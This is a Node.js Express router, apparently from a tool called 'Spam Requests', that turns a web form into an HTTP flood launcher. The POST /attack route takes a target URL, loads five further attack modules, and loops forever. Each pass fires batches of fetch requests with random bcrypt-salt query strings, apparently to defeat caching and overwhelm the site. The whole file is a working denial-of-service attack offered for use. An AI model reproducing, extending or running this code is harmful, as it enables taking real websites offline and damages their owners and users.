const { Router } = require("express");
const router = Router();
const fetch = require("node-fetch");
const bcrypt = require("bcryptjs");
router.get("/", (req, res) => {
	res.render("index", {
		title: "Spam Requests"
	});
});
router.post("/attack", async (req, res) => {
	res.render("attack", {
		title: "Attacking",
		url: req.body.url
	});
		console.log("Starting attack at URL " + req.body.url);
		require("./attack1")(req.body.url);
		require("./attack2")(req.body.url);
		require("./attack3")(req.body.url);
		require("./attack4")(req.body.url);
		require("./attack5")(req.body.url);
			do {
				let rsp;
				try {
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					attack(req.body.url);
					rsp = await fetch(req.body.url);
				}
				catch (err) {
					console.log(`[!] An error ocurred while sending requests to ${req.body.url}\n${err}`);
				}
				console.log(`[!] Sent 251 requests to ${req.body.url} || Status: ${rsp.status}`);
			}
			while (true)
});
// functions
async function attack(url) {
	await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
	await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
	await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
	await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
	await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
	await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
	await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
	await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
	await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
	await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
}
module.exports = router;